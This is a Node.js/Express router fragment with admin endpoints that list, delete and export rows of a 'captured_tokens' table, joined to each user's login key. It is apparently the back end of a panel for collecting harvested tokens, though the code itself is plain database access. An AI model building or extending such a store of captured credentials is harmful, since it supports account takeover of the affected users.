router.get('/tokens', adminAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      `SELECT ct.*, u.login_key FROM captured_tokens ct 
       LEFT JOIN users u ON ct.user_id = u.id 
       ORDER BY ct.created_at DESC LIMIT 200`
    );
    res.json({ tokens });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Delete a token (admin)
router.delete('/tokens/:id', adminAuth, async (req, res) => {
  await db.query('DELETE FROM captured_tokens WHERE id = ?', [req.params.id]);
  res.json({ success: true });
});

// Export tokens (admin)
router.get('/tokens/export', adminAuth, async (req, res) => {
  const [tokens] = await db.query('SELECT * FROM captured_tokens ORDER BY created_at DESC');
  res.json(tokens);
});

module.exports = router;
